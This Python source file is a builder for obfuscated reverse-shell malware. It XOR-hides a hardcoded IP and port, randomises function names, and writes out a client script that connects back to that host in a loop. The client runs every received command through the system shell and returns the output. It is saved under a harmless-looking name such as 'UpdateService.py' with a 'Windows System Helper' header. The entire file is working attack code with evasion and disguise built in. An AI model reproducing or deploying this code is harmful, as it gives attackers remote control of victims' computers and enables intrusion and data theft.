import random
import string
import os

REAL_IP = "192.168.1.28"
REAL_PORT = 7777
XOR_KEY = 0x42

def random_name(length=12):
    return ''.join(random.choices(string.ascii_letters, k=length))

def xor_encrypt(text: str):
    return ''.join(chr(ord(c) ^ XOR_KEY) for c in text)

# Hide IP:PORT
hidden_host = xor_encrypt(REAL_IP)
hidden_port = str(REAL_PORT ^ XOR_KEY)

def generate_simple_client():
    names = {
        'main': random_name(),
        'connect': random_name(),
        'decode': random_name(),
    }

    core_code = f'''
def {names['decode']}(encrypted):
    key = {XOR_KEY}
    return ''.join(chr(ord(c) ^ key) for c in encrypted)

host = {names['decode']}("{hidden_host}")
port = int("{hidden_port}") ^ {XOR_KEY}

def {names['connect']}():
    socket = __import__('socket')
    subprocess = __import__('subprocess')
    os = __import__('os')
    time = __import__('time')

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            while True:
                cmd = s.recv(4096).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    break
                if cmd == "STOP_MALWARE_12345":
                    os._exit(0)

                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
                s.send(result + b"\\n")

            s.close()
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    {names['connect']}()
'''

    filenames = ["UpdateService.py", "SystemHelper.py", "NetworkTool.py", "BackgroundTask.py"]
    output_file = random.choice(filenames)

    with open(output_file, "w") as f:
        f.write(f'# Windows System Helper\n\n{core_code}')


if __name__ == "__main__":
    generate_simple_client()